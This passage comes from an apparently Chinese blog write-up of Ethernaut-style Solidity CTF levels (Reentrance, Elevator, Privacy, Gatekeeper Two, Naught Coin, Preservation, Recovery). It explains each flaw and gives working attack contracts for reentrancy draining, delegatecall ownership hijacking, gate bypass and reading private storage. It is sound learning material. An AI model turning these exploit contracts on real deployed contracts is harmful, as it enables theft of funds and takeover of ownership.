<br>  using SafeMath for uint256;<br>  mapping(address =&gt; uint) public balances;<br><br>  function donate(address _to) public payable &#123;<br>    balances[_to] = balances[_to].add(msg.value);<br>  &#125;<br><br>  function balanceOf(address _who) public view returns (uint balance) &#123;<br>    return balances[_who];<br>  &#125;<br><br>  function withdraw(uint _amount) public &#123;<br>    if(balances[msg.sender] &gt;= _amount) &#123;<br>      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);<br>      if(result) &#123;<br>        _amount;<br>      &#125;<br>      balances[msg.sender] -= _amount;<br>    &#125;<br>  &#125;<br><br>  receive() external payable <br></code></pre></td></tr></table></figure><p>要求盗取所有余额。</p><h4 id="Analyse-1"><a href="#Analyse-1" class="headerlink" title="Analyse"></a>Analyse</h4><p>是重入攻击，漏洞在于withdraw函数。可以看到他是先调用了<code>msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</code>然后再在balance里面将存储的余额减去amount。这里就是可重入攻击的关键所在了，因为该函数在发送ether后才更新余额，所以我们可以想办法让它卡在call.value这里不断给我们发送ether，因为call的参数是空，所以会调用攻击合约的fallback函数，我们在fallback函数里面再次调用withdraw，这样套娃，就能将合约里面的钱都偷出来。</p><h4 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>interface IReentrance &#123;<br>    function withdraw(uint256 _amount) external;<br>&#125;<br><br>contract Reentrance &#123;<br>    address levelInstance;<br><br>    constructor(address _levelInstance) &#123;<br>        levelInstance = _levelInstance;<br>    &#125;<br><br>    function claim(uint256 _amount) public &#123;<br>        IReentrance(levelInstance).withdraw(_amount);<br>    &#125;<br><br>    fallback() external payable &#123;<br>        IReentrance(levelInstance).withdraw(msg.value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>还有一种是循环调用withdraw函数,并加以限制。</p><p>我们需要进行donate进行转账，来满足第一个条件，所以</p><p><img src="/../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-27%20175711.png" alt="屏幕截图 2023-11-27 175711"></p><p>然后执行attack函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>interface IReentrance &#123;<br>    function withdraw(uint256) external payable;<br>    function donate(address) external payable;<br>&#125;<br>contract Hack&#123;<br>  IReentrance private immutable target;<br>  constructor(address _target)&#123;<br>    target= IReentrance(_target);<br>  &#125;<br>  function attack() external payable&#123;<br>    target.donate&#123;value: 1e18&#125;(address(this));<br>    target.withdraw(1e18);<br>    require(address(target).balance ==0,&#x27;target balance&gt;0&#x27;);<br>    selfdestruct(payable(msg.sender));<br>  &#125;<br>  receive()external payable&#123;<br>    uint amount=min(1e18,address(target).balance);<br>    if(amount&gt;0)&#123;<br>      target.withdraw(amount);<br>    &#125;<br>  &#125;<br>  function min(uint x,uint y) private pure returns(uint)&#123;<br>    return x&lt;= y ? x : y;<br>  &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a><strong>Elevator</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>interface Building &#123;<br>  function isLastFloor(uint) external returns (bool);<br>&#125;<br><br><br>contract Elevator &#123;<br>  bool public top;<br>  uint public floor;<br><br>  function goTo(uint _floor) public &#123;<br>    Building building = Building(msg.sender);<br><br>    if (! building.isLastFloor(_floor)) &#123;<br>      floor = _floor;<br>      top = building.isLastFloor(floor);<br>    &#125;<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>要求到达top floor。</p><p>buliding是一个加载调用者得知的接口。而要想达到top floor。则须经过isLastFloor的检测。然而却需要两次检测，第一次是false，第二次是true。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>interface Building &#123;<br>  function isLastFloor(uint) external returns (bool);<br>&#125;<br><br><br>contract Elevator &#123;<br>  bool public top;<br>  uint public floor;<br><br>  function goTo(uint _floor) public &#123;<br>    Building building = Building(msg.sender);<br><br>    if (! building.isLastFloor(_floor)) &#123;<br>      floor = _floor;<br>      top = building.isLastFloor(floor);<br>    &#125;<br>  &#125;<br>&#125;<br>contract Hack&#123;<br>  Elevator private immutable target;<br>  uint public count;<br>  constructor(address _target)&#123;<br>     target=Elevator(_target);<br>  &#125;<br>  function pwn() external&#123;<br>    target.goTo(1);<br>    require(target.top(),&#x27;not top&#x27;);<br>  &#125;<br>  function isLastFloor(uint) external returns(bool)&#123;<br>    count++;<br>    return count&gt;1;<br>  &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><p>当我们调用goTo函数时Building building &#x3D; Building(msg.sender);，将是攻击合约的地址。我们创建isLastFloor，通过跟踪调用次数，来进行检验。</p><h3 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a><strong>Privacy</strong></h3><p>要求unlock为false，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>contract Privacy &#123;<br><br>  bool public locked = true; //1 slot0<br>  uint256 public ID = block.timestamp; // 32 slot1<br>  uint8 private flattening = 10; //2 slot2<br>  uint8 private denomination = 255; //2 slot2<br>  uint16 private awkwardness = uint16(block.timestamp); //4 slot2<br>  bytes32[3] private data; //32 slot3<br><br>  constructor(bytes32[3] memory _data) &#123;<br>    data = _data;<br>  &#125;<br>  <br>  function unlock(bytes16 _key) public &#123;<br>    require(_key == bytes16(data[2]));<br>    locked = false;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>要想解开，需要使 _key &#x3D;&#x3D; bytes16(data[2]), 也就是说我们需要得到定长数组data的第三个数据。由于变量是私有的，没有getter函数可以直接调用获得存储的key。</p><p>但是可以使用web3库来调用。根据存储的规则，data数组为定长数组，第一个数据存储再slot3，所以data[2]存储在slot5.</p><p><img src="/../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-29%20222116.png" alt="屏幕截图 2023-11-29 222116"></p><p>然后需要前16个字节，两个字符为一个字节，2+2*16&#x3D;34</p><p><img src="/../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-29%20222139.png" alt="屏幕截图 2023-11-29 222139"></p><p>得到密钥，然后将其合约填入并调用unlock函数即可通关。</p><h3 id="Gatekeeper-Two"><a href="#Gatekeeper-Two" class="headerlink" title="Gatekeeper Two"></a>Gatekeeper Two</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract GatekeeperTwo &#123;<br><br>  address public entrant;<br><br>  modifier gateOne() &#123;<br>    require(msg.sender != tx.origin);<br>    _;<br>  &#125;<br><br>  modifier gateTwo() &#123;<br>    uint x;<br>    assembly &#123; x := extcodesize(caller()) &#125;<br>    require(x == 0);<br>    _;<br>  &#125;<br><br>  modifier gateThree(bytes8 _gateKey) &#123;<br>    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);<br>    _;<br>  &#125;<br><br>  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;<br>    entrant = tx.origin;<br>    return true;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>三个关卡，然后true</p><h4 id="Analyse-2"><a href="#Analyse-2" class="headerlink" title="Analyse"></a>Analyse</h4><p>第一关我们可以使用智能合约调用enter，而不是账号。</p><p>第二关，只允许外部调用，不允许合约之间调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">modifier gateTwo() &#123;<br>   uint x;<br>   assembly &#123; x := extcodesize(caller()) &#125;<br>   require(x == 0);<br>   _;<br> &#125;<br></code></pre></td></tr></table></figure><p>第三关</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">modifier gateThree(bytes8 _gateKey) &#123;<br>    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);<br>    _;<br>  &#125;<br></code></pre></td></tr></table></figure><p>uint64(0) – 1，为uint64最大值。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">bytes8</span><span class="hljs-params">(keccak256(abi.encodePacked(msg.sender)</span></span>))部分是从msg<span class="hljs-selector-class">.sender</span>(即本例中的Exploiter合约)中抽取低位的<span class="hljs-number">8</span>字节并将其转换为uint64。<br><br>指令<span class="hljs-selector-tag">a</span> ^ b是位的XOR（异或）操作。XOR 操作是这样的：如果位置上的两个位相等，将产生一个 <span class="hljs-string">&quot;0&quot;</span>，否则将产生一个 <span class="hljs-string">&quot;1&quot;</span>。为了使<span class="hljs-selector-tag">a</span> ^ <span class="hljs-selector-tag">b</span> = <span class="hljs-built_in">type</span>(uint64).max（都是<span class="hljs-number">1</span>）， b必须是a的逆数。<br><br>这意味着我们的gateKey必须是<span class="hljs-built_in">bytes8</span>(<span class="hljs-built_in">keccak256</span>(abi<span class="hljs-selector-class">.encodePacked</span>(msg.sender))的逆数。<br><br>在solidity中，没有 <span class="hljs-string">&quot;逆数&quot;</span>的操作，但我们可以通过输入数和一个只有 <span class="hljs-string">&quot;F&quot;</span>的值之间做 <span class="hljs-string">&quot;XOR &quot;</span>来重新创建它。<br></code></pre></td></tr></table></figure><p>所以只需计算bytes8(keccak256(abi.encodePacked(address(this)))) ^ 0xFFFFFFFFFFFFFFFF</p><h4 id="attack-1"><a href="#attack-1" class="headerlink" title="attack"></a>attack</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract attack&#123;<br>  constructor(address _vum)&#123;<br>    bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);<br>    bytes memory payload = abi.encodeWithSignature(&quot;enter(bytes8)&quot;,_key);<br>    (bool success,)=_vum.call(payload);<br>    require(success,&quot;failed&quot;);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Naught-Coin"><a href="#Naught-Coin" class="headerlink" title="Naught Coin"></a>Naught Coin</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;<br><br>contract NaughtCoin is ERC20 &#123;<br>    // string public constant name = &#x27;NaughtCoin&#x27;;<br>    // string public constant symbol = &#x27;0x0&#x27;;<br>    // uint public constant decimals = 18;<br>    uint256 public timeLock = block.timestamp + 10 * 365 days;<br>    uint256 public INITIAL_SUPPLY;<br>    address public player;<br><br>    constructor(address _player) ERC20(&quot;NaughtCoin&quot;, &quot;0x0&quot;) &#123;<br>        player = _player;<br>        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));<br>        // _totalSupply = INITIAL_SUPPLY;<br>        // _balances[player] = INITIAL_SUPPLY;<br>        _mint(player, INITIAL_SUPPLY);<br>        emit Transfer(address(0), player, INITIAL_SUPPLY);<br>    &#125;<br><br>    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) &#123;<br>        super.transfer(_to, _value);<br>    &#125;<br><br>    // Prevent the initial owner from transferring tokens until the timelock has passed<br>    modifier lockTokens() &#123;<br>        if (msg.sender == player) &#123;<br>            require(block.timestamp &gt; timeLock);<br>            _;<br>        &#125; else &#123;<br>            _;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>要求代币变为0即可。</p><p>ERC20标准转账代币有两种方式，transfer以及transferFrom，但是transfer被重写了，所以只能用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function transferFrom(<br>        address from,<br>        address to,<br>        uint256 amount<br>    ) public virtual override returns (bool) &#123;<br>        address spender = _msgSender();<br>        _spendAllowance(from, spender, amount);<br>        _transfer(from, to, amount);<br>        return true;<br>    &#125;<br></code></pre></td></tr></table></figure><p>但是转帐前，需要approver授权。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">//secondaddr是另外一个账户地址<br>secondad=&#x27;0x02823a3D576A35988a623BB3d7F9e9A6D0ae7674&#x27;<br>totalvalue=&#x27;1000000000000000000000000&#x27;<br>//给自己授权<br>await contract.approve(player,totalvalue)<br>await contract.transferFrom(player,secondaddr,totalvalue)<br></code></pre></td></tr></table></figure><h3 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a><strong>Preservation</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Preservation &#123;<br>    // public library contracts<br>    address public timeZone1Library;<br>    address public timeZone2Library;<br>    address public owner;<br>    uint256 storedTime;<br>    // Sets the function signature for delegatecall<br>    bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));<br><br>    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) &#123;<br>        timeZone1Library = _timeZone1LibraryAddress;<br>        timeZone2Library = _timeZone2LibraryAddress;<br>        owner = msg.sender;<br>    &#125;<br><br>    // set the time for timezone 1<br>    function setFirstTime(uint256 _timeStamp) public &#123;<br>        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));<br>    &#125;<br><br>    // set the time for timezone 2<br>    function setSecondTime(uint256 _timeStamp) public &#123;<br>        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));<br>    &#125;<br>&#125;<br><br>// Simple library contract to set the time<br>contract LibraryContract &#123;<br>    // stores a timestamp<br>    uint256 storedTime;<br><br>    function setTime(uint256 _time) public &#123;<br>        storedTime = _time;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>要求获得合约所有权。</p><p>本题的关键就是delegatecall函数，该函数调用后内置变量 <code>msg</code> 的值不会修改为调用者，但执行环境为调用者的运行环境（相当于复制被调用者的代码到调用者合约）。也就是说</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity"> function setFirstTime(uint256 _timeStamp) public &#123;<br>        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));<br>    &#125;<br>function setSecondTime(uint256 _timeStamp) public &#123;<br>        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));<br>    &#125;<br></code></pre></td></tr></table></figure><p>当这两个函数调用时，他们改变的是slot0的变量，而我们要求改变合约的拥有者，即slot2处的变量。而这两个合约的变量分布为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">===================================================<br>    unused       |                timeZone1Library<br>---------------------------------------------------         slot 0<br>    12 bytes     |                20 bytes<br>===================================================<br>    unused       |                timeZone2Library<br>---------------------------------------------------         slot 1<br>    12 bytes     |                20 bytes<br>===================================================<br>    unused       |                owner<br>---------------------------------------------------         slot 2<br>    12 bytes     |                20 bytes<br>===================================================<br>                storedTime<br>---------------------------------------------------         slot 3<br>                32 bytes<br>===================================================<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">===================================================<br>                storedTime<br>---------------------------------------------------         slot 0<br>                32 bytes<br>===================================================<br></code></pre></td></tr></table></figure><p>所以当我们调用setFirstTime函数时，我们调用的是setTime函数。因此，我们可以将timeZone1Library的地址改为攻击合约的地址，然后在攻击合约中写一个setime函数，当执行imeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));时，就可以调用攻击合约的setime函数。</p><p>我们需要注意owner占据slot2 的低20个字节即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>contract AttackPreservation &#123;<br><br>    // stores a timestamp<br>    address doesNotMatterWhatThisIsOne;<br>    address doesNotMatterWhatThisIsTwo;<br>    address maliciousIndex;<br><br>    function setTime(uint _time) public &#123;<br>        maliciousIndex = address(uint160(_time));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>部署完成后，执行await contract.setFirstTime(‘攻击合约’)</p><p>然后再执行 await contract.setFirstTime(‘player’)就可以了。</p><h3 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a><strong>Recovery</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Recovery &#123;<br>    //generate tokens<br>    function generateToken(string memory _name, uint256 _initialSupply) public &#123;<br>        new SimpleToken(_name, msg.sender, _initialSupply);<br>    &#125;<br>&#125;<br><br>contract SimpleToken &#123;<br>    string public name;<br>    mapping(address =&gt; uint256) public balances;<br><br>    // constructor<br>    constructor(string memory _name, address _creator, uint256 _initialSupply) &#123;<br>        name = _name;<br>        balances[_creator] = _initialSupply;<br>    &#125;<br><br>    // collect ether in return for tokens<br>    receive() external payable &#123;<br>        balances[msg.sender] = msg.value * 10;<br>    &#125;<br><br>    // allow transfers of tokens<br>    function transfer(address _to, uint256 _amount) public &#123;<br>        require(balances[msg.sender] &gt;= _amount);<br>        balances[msg.sender] = balances[msg.sender] - _amount;<br>        balances[_to] = _amount;<br>    &#125;<br><br>    // clean up after ourselves<br>    function destroy(address payable _to) public &#123;<br>        selfdestruct(_to);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>从合约地址找回丢失的0.5eth</p><h4 id="Analyse-3"><a href="#Analyse-3" class="headerlink" title="Analyse"></a>Analyse</h4><p>通过自毁函数进行转账</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function destroy(address payable _to) public &#123;<br>      selfdestruct(_to);<br>  &#125;<br></code></pre></td></tr></table></figure><p>更新msg.sender余额</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function transfer(address _to, uint256 _amount) public &#123;<br>     require(balances[msg.sender] &gt;= _amount);<br>     balances[msg.sender] = balances[msg.sender] - _amount;<br>     balances[_to] = _amount;<br> &#125;<br></code></pre></td></tr></table></figure><p>只需找到合约地址实行自毁函数将eth转会玩家地址就行。</p><h5 id="寻找地址"><a href="#寻找地址" class="headerlink" title="寻找地址"></a>寻找地址</h5><ol><li><p>通过etherscan进行查找</p></li><li><p>计算得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>contract Hack &#123;<br>    function getdd(address target) public view returns (address) &#123;<br>        address data = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), target, bytes1(0x01))))));<br>        return data; //0x8B7bAdf88cBaE3F8Ed26Df75475133E4972bB606<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ol><h4 id="Attack-1"><a href="#Attack-1" class="headerlink" title="Attack"></a>Attack</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>contract attack &#123;<br>    address payable target; //合约地址<br>    address payable myaddr; //player<br><br>    constructor(address payable _addr, address payable _myaddr) public &#123;<br>        target=_addr;<br>        myaddr=_myaddr;<br>    &#125;<br>    <br>    function exploit() public&#123;<br>        target.call(abi.encodeWithSignature(&quot;destroy(address)&quot;,myaddr));<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>部署后运行 exploit函数就行。</p><h3 id="MagicNumber"><a href="#MagicNumber" class="headerlink" title="MagicNumber"></a><strong>MagicNumber</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract MagicNum &#123;<br>    address public solver;<br><br>    constructor() &#123;&#125;<br><br>    function setSolver(address _solver) public &#123;<br>        solver = _solver;<br>    